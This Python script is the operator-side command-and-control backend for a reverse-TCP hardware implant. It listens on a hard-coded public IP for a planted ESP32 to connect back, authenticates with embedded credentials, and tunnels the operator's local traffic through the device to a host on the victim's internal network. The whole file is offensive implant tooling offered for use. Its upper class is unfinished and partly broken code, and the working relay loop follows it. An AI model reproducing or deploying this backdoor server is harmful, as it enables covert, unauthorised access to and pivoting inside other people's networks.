#!/usr/bin/env python3
"""
	TCPImplantBackend
	(c) Sem Voigtlander (@userlandkernel), all rights reserved. 

"""

import sys
import _thread
import time
import struct
from enum import Enum
import select
import socket
from ctypes import Structure, c_uint16, c_uint32, c_uint8, c_char_p

## Proxy Protocol
class ProxyPacketType(Enum):
	NOP = 0x00,
	AUTH = 0xA0,
	AUTHFAIL = 0xAF,
	DATA = 0xD0,
	ENDRESPONSE = 0xDE

class ProxyPacketHeader(Structure):
	__pack__ = 1
	__fields__ = [
		("packetType", c_uint32),
	]

class ProxyPacketAuth(Structure):
	__pack__ = 1
	__fields__ = [
		("loginName", c_char_p * 256),
		("loginPassword", c_char_p * 256),
	]

class ProxyPacketData(Structure):
	__pack__ = 1
	__fields__ = [
		("packetLength", c_uint32),
		("domain", c_char_p * 253),
		("port", c_uint16),
	]

## Socket handling
def recvall(sock, timeout=0.2):
	buff = bytes()
	while  True:
		data = None
		ready = select.select([sock], [], [], timeout)
		if ready[0]:
			data = sock.recv(1024)
			if not data:
					break
			buff += data

	return buff

## Protocol handling interface
class TCImplantESPInterface:

	def __init__(self):
		super().__init__()

	def Authenticate(self, username="DEFQON-APT", password="S3FA_Peac0ck2021!"):
		header = ProxyPacketHeader(ProxyPacketType.AUTH)
		return False

	def PingESP(self):
		header = ProxyPacketHeader(ProxyPacketHeader.NOP)

	def SendData(self, data=bytes()):
		header = ProxyPacketHeader(ProxyPacketHeader.DATA)
		return -1

## Main routines
class TCPImplantBackdoor(TCImplantESPInterface):

	def __init__(self, debug=False):
		super().__init__()
		
		self.debug = debug

		# Input Listener bound to localhost:8080
		self.LHOST = "127.0.0.1"
		self.LPORT = 8080

		# ESP connect-back public server
		self.SRVHOST = "95.179.129.108"
		self.SRVPORT = 1337

		self.THOST = "192.168.178.31" # Target host
		self.TPORT = 4444 # Target port

		if debug:
			print("Creating socket listening for esp connection on {}:{}...".format(self.SRVHOST, self.SRVPORT))

		# Create Listener Socket for the ESP
		self.espServ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.espServ.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.espServ.bind((self.SRVHOST, self.SRVPORT,))

		if debug:
			print("Creating socket listening for user input on {}:{}...".format(self.LHOST, self.LPORT))

		# Create Listener Socket for Input
		self.inputServ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.inputServ.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	
	def startInputServer(self, espConn):

		# Start local input Server
		print("Starting Input server on {}:{}...".format(self.LHOST, self.LPORT,))
		self.inputServ.bind((self.LHOST, self.LPORT,))
		self.inputServ.listen(1)

		# BEGIN INPUT SERVER BLOCK
		while True:

			try:
				# Wait for input client
				inputConn, inputAddr = self.inputServ.accept()
				inputConn.setblocking(0)
				print("Input client connected:", inputAddr)

			except Exception as InputClientBlockExc:
				print(InputClientBlockExc)
				break

	def Run(self):

		print("Starting ESP connect-back server on {}:{}...".format(self.SRVHOST, self.SRVPORT))
		self.espServ.listen(1)

		# BEGIN ESP SERVER BLOCK
		while True:
			
			# Wait for esp to connect
			espConn, espAddr = self.espServ.accept()
			espConn.setblocking(0)
			print("ESP connected:", espAddr)

			try:

				# Authenticate with the ESP
				if not self.Authenticate():
					print("Failed to authenticate with ESP.")
					break

			except Exception as ESPAuthBlockExc:
				print(ESPAuthBlockExc)
				break

			self.startInputServer(espConn) # Threaded eta s0n


			# END INPUT SERVER BLOCK

		# END ESP SERVER BLOCK

		print("Thanks for using the ESP Reverse-TCP Implant")
		print("Support my projects with crypto for more awesome stuff! @userlandkernel")
		print("BTC: ")
		print("LTC: ")
		print("DOGE: ")
		print("SUGAR: ")


"""
	Above code simply is WIP, it will be lit when its done.  
	For now u have to do with the ugly code below.  
"""


reverseClient = None

def SendProxyAuth(sock, username, password):

	# Send the header
	hdr = struct.pack("I", 0xA0)
	sock.sendall(hdr)
	packet = struct.pack("256s256s", username.encode(), password.encode())
	sock.sendall(packet)


def SendProxyNOP(sock):

	# Send the header
	hdr = struct.pack("I", 0x00)
	sock.sendall(hdr)

def SendProxyData(sock, data=bytes(), length=0, domain="192.168.178.31", port=1337):

	# Send the header
	hdr = struct.pack("I", 0xD0)
	sock.sendall(hdr)
	packet = struct.pack("I253sH", length, domain.encode(), port)
	sock.sendall(packet)
	sock.sendall(data)

def ReceiveResponse(sock, lsock):

	while True:

		try:
			hdr = sock.recv(4)
			if len(hdr) != 4:
				print("INVALID PACKET HEADER :(")
			packetType = struct.unpack("I", hdr)[0]
			print("Received response  packet:", hex(packetType))
			if packetType == 0xD0:
				packetRaw = sock.recv(254+2+4)
				packetLen, domain, port = struct.unpack("I253sH", packetRaw)
				lsock.sendall(sock.recv(packetLen))
				print("Received response from {}:{} with {} bytes.".format(domain.decode(), port, packetLen))
			elif packetType == 0xDE:
				break

			else:
				print("Invalid packet received: {}".format(packetType))

		except Exception as exc:
			raise exc
			break


# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Bind the socket to the port
server_address = ("95.179.129.108", 1337, )
print('starting up on {} port {}'.format(*server_address))
sock.bind(server_address)

# Listen for incoming connections
sock.listen(1)

while True:
	# Wait for a connection
	print('Waiting for ESP-32 to connect to us...')
	espConn, client_address = sock.accept()
	try:
		print('Got connection from ESP32:', client_address)

		# Setup local input socket
		localSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		localSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		localAddr = ("127.0.0.1", 8080,)
		print("Starting local input socket on {} port {}...".format(*localAddr))
		localSock.bind(localAddr)
		localSock.listen(1)

		# Send NOP to test connection
		SendProxyNOP(espConn)

		# Authenticate with ESP-32
		SendProxyAuth(espConn, "MY_CLIENTID", "MY_PASSWORD_HERE")


		while True:
			# Wait for local connection
			lconn, lclientAddr = localSock.accept()
			lconn.setblocking(0)
			print("Got local connection from:",lclientAddr)
			buffer = bytes()
			while True:
				data = None
				ready = select.select([lconn], [], [], 0.2)
				if ready[0]:
					data = lconn.recv(1024)
				if not data:
					break
				buffer += data
			print("Sending {} bytes to the target...".format(len(buffer)))
			SendProxyData(espConn, buffer, len(buffer))
			print("Receiving response from the target...")
			ReceiveResponse(espConn, lconn)
			lconn.close()

	except Exception as exc:
		print(exc)

	espConn.close()
